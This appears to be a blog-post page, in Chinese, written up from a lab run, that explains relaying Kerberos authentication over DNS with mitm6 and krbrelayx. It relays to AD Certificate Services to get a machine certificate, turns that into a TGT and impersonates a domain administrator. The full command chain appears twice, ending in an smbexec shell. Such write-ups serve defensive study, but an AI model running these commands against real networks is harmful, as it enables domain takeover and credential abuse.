@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:lzz]">
+<meta name="description" content="当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解
+利用条件 一台Linux，同C段有一台域机器，能访问ADCS Web注册页面
+漏洞存因 1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。
+如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。
+2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：
+1. 域内机器查询DNS中的SOA记录。 2. 域内DNS通常绑定在域控上，对查询进行回应。 3. 域机器请求对A记录进行动态更新。 4. 因为没有提供身份验证，DNS拒绝动态更新。 5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。 6. 服务器回答TKEY资源记录，完成身份验证。 7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。 8. 服务器更新其DNS记录。 第 5 步和第 6 步，包含 Kerberos 身份验证过程：
+wireshark中提供直接将keytab 导入Kerberos，能将加密字段进行解密。
+利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。
+3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。
+4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。" />
+<meta name="keywords" content="homepage, blog, science, informatics, development, programming, AD, EXP" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://lzzbb.github.io/posts/2022/02/%E9%80%9A%E8%BF%87dns%E8%BF%9B%E8%A1%8Ckerberos-relay/" />
+
+
+    <title>
+        
+            通过DNS进行Kerberos Relay :: lzzzzzzz 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://lzzbb.github.io/main.2461b42f711aae674dd78e353275891fa072d7bf2ea9fbd577297a99dde78461.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://lzzbb.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://lzzbb.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://lzzbb.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://lzzbb.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://lzzbb.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://lzzbb.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="通过DNS进行Kerberos Relay">
+<meta itemprop="description" content="当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解
+利用条件 一台Linux，同C段有一台域机器，能访问ADCS Web注册页面
+漏洞存因 1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。
+如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。
+2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：
+1. 域内机器查询DNS中的SOA记录。 2. 域内DNS通常绑定在域控上，对查询进行回应。 3. 域机器请求对A记录进行动态更新。 4. 因为没有提供身份验证，DNS拒绝动态更新。 5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。 6. 服务器回答TKEY资源记录，完成身份验证。 7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。 8. 服务器更新其DNS记录。 第 5 步和第 6 步，包含 Kerberos 身份验证过程：
+wireshark中提供直接将keytab 导入Kerberos，能将加密字段进行解密。
+利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。
+3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。
+4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。"><meta itemprop="datePublished" content="2022-02-25T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-02-25T00:00:00+00:00" />
+<meta itemprop="wordCount" content="234"><meta itemprop="image" content="https://lzzbb.github.io/"/>
+<meta itemprop="keywords" content="AD,EXP," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://lzzbb.github.io/"/>
+
+<meta name="twitter:title" content="通过DNS进行Kerberos Relay"/>
+<meta name="twitter:description" content="当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解
+利用条件 一台Linux，同C段有一台域机器，能访问ADCS Web注册页面
+漏洞存因 1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。
+如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。
+2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：
+1. 域内机器查询DNS中的SOA记录。 2. 域内DNS通常绑定在域控上，对查询进行回应。 3. 域机器请求对A记录进行动态更新。 4. 因为没有提供身份验证，DNS拒绝动态更新。 5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。 6. 服务器回答TKEY资源记录，完成身份验证。 7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。 8. 服务器更新其DNS记录。 第 5 步和第 6 步，包含 Kerberos 身份验证过程：
+wireshark中提供直接将keytab 导入Kerberos，能将加密字段进行解密。
+利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。
+3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。
+4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。"/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-02-25 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://lzzbb.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">cd ~/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://lzzbb.github.io/posts">Posts</a></li><li><a href="https://lzzbb.github.io/tags/">Tags</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        2 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://lzzbb.github.io/posts/2022/02/%E9%80%9A%E8%BF%87dns%E8%BF%9B%E8%A1%8Ckerberos-relay/">通过DNS进行Kerberos Relay</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>当时成功后没截图，环境又出问题不想搭了，下面有些截图出处作者，旨在阐明自己的观点和理解</p>
+<h2 id="利用条件">利用条件</h2>
+<p>一台Linux，同C段有一台域机器，能访问ADCS Web注册页面</p>
+<h2 id="漏洞存因">漏洞存因</h2>
+<p>1.自 Windows Vista 以来的所有 Windows 都默认启用了IPV6，并且优先级比IPV4更高，每台机器都会定期请求DNS配置。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/1.png" alt=""></p>
+<p>如果攻击者获取了一台linux权限，并在广播域内存在另外一台域机器，可以利用mitm6对其进行DNS欺骗，让域机器认定linux是自己的权威域名服务器。</p>
+<p>2.AD中的 DNS 支持使用 Kerberos 在 DNS 上进行身份验证，用于此使具有动态地址的网络客户端的 DNS 记录与其当前 IP 地址保持同步：</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/2.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1. 域内机器查询DNS中的SOA记录。
+</span></span><span class="line"><span class="cl">2. 域内DNS通常绑定在域控上，对查询进行回应。
+</span></span><span class="line"><span class="cl">3. 域机器请求对A记录进行动态更新。
+</span></span><span class="line"><span class="cl">4. 因为没有提供身份验证，DNS拒绝动态更新。
+</span></span><span class="line"><span class="cl">5. 客户端使用TKEY查询来协商经过身份验证的查询的密钥。
+</span></span><span class="line"><span class="cl">6. 服务器回答TKEY资源记录，完成身份验证。
+</span></span><span class="line"><span class="cl">7. 客户端再次发送动态更新，但现在伴随着一条TSIG记录，该记录是使用在步骤5和6中建立的密钥的签名。
+</span></span><span class="line"><span class="cl">8. 服务器更新其DNS记录。
+</span></span></code></pre></div><p>第 5 步和第 6 步，包含 Kerberos 身份验证过程：</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/3.png" alt=""></p>
+<p>wireshark中提供直接将<a href="https://wiki.wireshark.org/Kerberos" title="keytab 导入Kerberos">keytab 导入Kerberos</a>，能将加密字段进行解密。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/4.png" alt=""></p>
+<p>利用上述流程，mitm6 可以将自己宣传为 DNS 服务器，所以受害者将发送SOA到攻击者指定的假服务器，如果攻击者拒绝他们的动态更新，再使用 Kerberos 进行身份验证。</p>
+<p>3.许多服务类实际上会隐式映射到 HOST 类（包括 DNS），因此当受害者请求 DNS 服务的票证时，实际上适用于具有 HOST SPN 的任何帐户。这是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。</p>
+<p>4.在去年的关于ADCS利用的白皮书中，ESC8的利用涉及 NTLM 中继到证书服务的 HTTP 接口部分来颁发证书。该接口接受 NTLM 身份验证并没有强制验证签名， 因此可以将接收到的Kerberos 身份验证转发到 ADCS web页面来申请用户证书。</p>
+<p>5.在RFC 4556 中定义了 PKINIT 为 Kerberos 的扩展协议，可通过X.509 证书用来获取 Kerberos 票据 。后续在ADCS web页面申请的证书可以转换为用户的TGT。</p>
+<h2 id="为什么不直接relay到ldap">为什么不直接relay到ldap？</h2>
+<p>通常 DNS 服务器角色在域控上运行。因此DNS 服务的服务票证已经适用于在 DC 上运行的服务，因为它们使用相同的帐户，所以可以更改票证中的服务名称。这意味着攻击者可以将此票证中继到例如 LDAP。但是，如果仔看 TKEY 查询中的身份验证，会发现设置了请求完整性（签名）的标志。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/5.png" alt=""></p>
+<p>这将自动触发 LDAP 签名，这会使整个攻击失败，因为如果没有在每条消息上提供有效的加密签名，之后我们就无法与 LDAP 交互。我们无法生成此签名，因为我们转发了身份验证并且实际上并不拥有解密服务票证和提取会话密钥所需的 Kerberos 密钥。</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<p>总流程如下：</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/6.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.受害机器在同个广播域定期请求DHCPv6配置。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.攻击者利用mitm6对受害者主机欺骗，指出自己的DNS是权威域名服务器。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3.受害者认定攻击者是权威域名服务器，向攻击者请求DNS动态更新。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4.更新被攻击者拒绝，需要让受害者进行身份验证。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">5.受害者向KDC（域控）请求指定服务（DNS）的ST票据，将票据传给攻击者再次进行身份认证。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">6.攻击者利用krbrelayx将ST relay到ADCS中的web页面申请受害者机器证书。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">7.攻击者利用gettgtpkinit将上一步申请的证书转化为受害者机器的TGT，并通过gets4uticket进行S4Utoself模仿域管访问拿到受害者机器最高权限。
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/7.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">域名：wd.local
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">域控：WIN-6ERMGJ5ECLO.wd.local （192.168.3.1）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ADCS服务器: adcs.wd.local (192.168.3.103)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">受害者（域内主机）：win10.wd.local （192.168.3.108）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">攻击者：192.168.3.100 
+</span></span></code></pre></div><p>受害机器在同个广播域定期请求DHCPv6配置。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/8.png" alt=""></p>
+<p>攻击者运行的mitm6 告诉受害者他是权威DNS服务器。</p>
+<p><code>mitm6 --domain wd.local --host-allowlist win10.wd.local --relay adcs.wd.local -v</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/9.png" alt=""></p>
+<p>当受害系统尝试执行 DNS 更新时，更新被攻击者拒绝，需要让受害者进行身份验证。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/10.png" alt=""></p>
+<p>受害者向KDC（域控）请求指定服务（DNS）的ST票据，并再次请求更新。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/11.png" alt=""></p>
+<p>将上一步生成的票据传给攻击者再次进行身份认证。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/12.png" alt=""></p>
+<p>攻击者利用krbrelayx将ST relay到ADCS中的web页面申请受害者机器证书。</p>
+<p><code>python3 krbrelayx.py --target http://adcs.wd.local/certsrv/ -ip 192.168.3.100 --victim win10.wd.local --adcs --template Machine</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/13.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/14.png" alt=""></p>
+<p>ADCS 服务器使用 HTTP 返回200 响应，开始申请证书。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/15.png" alt=""></p>
+<p>申请证书成功，返回win10机器帐户base64 cert。</p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/16.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/17.png" alt=""></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/18.png" alt=""></p>
+<p>利用gettgtpkinit将上一步申请的证书转化为受害者机器win10的TGT。</p>
+<p><code>python3 gettgtpkinit.py -pfx-base64 $(cat cert.txt) wd.local/win10$ win10.ccache -dc-ip 192.168.3.1</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/19.png" alt=""></p>
+<p>通过gets4uticket将TGT进行S4Utoself模仿域管访问拿到受害者机器最高权限。</p>
+<p><code>python3 gets4uticket.py kerberos+ccache://wd.local\\win10\$:win10.ccache@WIN-6ERMGJ5ECL0.wd.local cifs/win10.wd.local@wd.local Administrator@wd.local admin.ccache</code></p>
+<p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/20.png" alt=""></p>
+<h3 id="验证票据是否有效">验证票据是否有效</h3>
+<p>通过使用smbexec.py进行验证</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">KRB5CCNAME=admin.ccache
+</span></span><span class="line"><span class="cl">python smbexec.py -k wd.local/Administrator@win10.wd.local -no-pass
+</span></span></code></pre></div><p><img src="https://raw.githubusercontent.com/lzzbb/lzzbb.github.io/master/picture/dns-kerberos-relay/21.png" alt=""></p>
+<h2 id="利用整理">利用整理</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1.告诉受害者用于更新DNS请求：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sudo mitm6 --domain redteam.lab --host-allowlist dmwin10.redteam.lab --relay AdcsMachine.redteam.lab -v
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2.将凭证Realy到ADCS web服务请求证书
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 krbrelayx.py --target http://AdcsMachine.redteam.lab/certsrv/ -ip 192.168.129.8 --victim dmwin10.redteam.lab --adcs --template Machine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">3.利用证书获取TGT：
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 gettgtpkinit.py -pfx-base64 $(cat cert.txt) redteam.lab/dmwin10$ dmwin10.ccache -dc-ip 192.168.129.131
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">4.将TGT进行S4U2self模仿域管访问拿到受害者机器最高权限
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python3 gets4uticket.py kerberos+ccache://redteam.lab\\dmwin10\$:dmwin10.ccache@dc2.redteam.lab cifs/dmwin10.redteam.lab@redteam.lab Administrator@redteam.lab admin.ccache
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">5.导入ST进行利用
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">KRB5CCNAME=admin.ccache 
+</span></span><span class="line"><span class="cl">python3 ~/in/impacket/examples/smbexec.py -k redteam.lab/Administrator@dmwin10.redteam.lab -no-pass
+</span></span></code></pre></div><h2 id="参考">参考</h2>
+<p><a href="https://vuls.cert.org/confluence/display/Wiki/2022/02/24/Kerberos+relaying+with+krbrelayx+and+mitm6">https://vuls.cert.org/confluence/display/Wiki/2022/02/24/Kerberos+relaying+with+krbrelayx+and+mitm6</a></p>
+<p><a href="https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/">https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/</a></p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://lzzbb.github.io/tags/ad/">AD</a></span>
+        <span class="tag"><a href="https://lzzbb.github.io/tags/exp/">EXP</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        234 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2022-02-25 08:00 &#43;0800
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+        <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+        </div>
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://lzzbb.github.io/posts/2022/05/wsus%E5%88%A9%E7%94%A8/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">WSUS利用</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="https://lzzbb.github.io/posts/2022/01/useraccountcontrol%E8%AE%BE%E7%BD%AE%E4%B8%BA8192%E4%BD%9C%E4%B8%BA%E5%90%8E%E9%97%A8/">
+                    <span class="button__text">userAccountControl设置为8192作为后门</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://lzzbb.github.io/bundle.min.a2c5b062c87998f04d1b5dfb6a89a1b2d79786c21d0cb63a05e8a2082984b64b77d80955e3b97eab17273775162ba372511b711fea2f7608f216e68a67bb22d6.js" integrity="sha512-osWwYsh5mPBNG137aomhsteXhsIdDLY6BeiiCCmEtkt32AlV47l&#43;qxcnN3UWK6NyURtxH&#43;ovdgjyFuaKZ7si1g=="></script>
+
+
+
+    </body>
+</html>
